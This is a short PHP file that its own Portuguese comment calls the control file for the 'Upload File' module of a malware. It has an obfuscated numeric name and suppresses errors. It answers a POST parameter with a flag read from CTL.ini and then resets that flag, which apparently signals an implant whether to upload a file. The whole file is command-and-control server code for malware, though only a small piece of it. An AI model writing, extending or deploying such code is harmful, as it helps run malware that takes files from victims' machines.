<?php
//
// 8748940939845.php ~~ UploadFile.php
//  Arquivo de controle do módulo de Upload File do Malware.
//

	error_reporting(0);
	if (isset($_POST["829492"])) {
		
		$CTLINI = parse_ini_file("CTL.ini", "CTL");
		$CTLIDX = $CTLINI["CTL"]["IDX"];
		
		if (strcmp($CTLIDX, "1") == 0) {
			echo "1";
			
			$buf = "[CTL]\nIDX=0\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		} else {
			echo "0";
	
			$buf = "[CTL]\nIDX=0\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		}
	}

// EOF
?>
